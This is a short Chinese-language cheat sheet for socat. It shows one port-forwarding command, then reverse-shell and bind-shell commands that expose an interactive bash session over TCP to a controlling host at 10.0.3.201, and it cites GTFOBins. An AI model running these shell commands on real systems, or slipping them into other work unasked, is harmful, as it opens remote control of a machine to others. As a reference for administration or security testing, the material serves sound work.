# socat

## 端口转发
```sh
sudo socat TCP-LISTEN:80,fork,reuseaddr TCP:127.0.0.1:8080
```

## 远程连接交互式 Shell
* 反向 Shell（被控端可访问控制端）
  * 控制端监听：``socat FILE:`tty`,raw,echo=0 TCP-LISTEN:12345``
  * 被控端连接：``socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane TCP:10.0.3.201:12345``
* 绑定 Shell（控制端可访问被控端）
  * 被控端监听：``socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane TCP-LISTEN:12345,reuseaddr,fork``
  * 控制端连接：``socat FILE:`tty`,raw,echo=0 TCP:10.0.3.201:12345``

参考来源：[GTFOBins: socat](https://gtfobins.github.io/gtfobins/socat/)
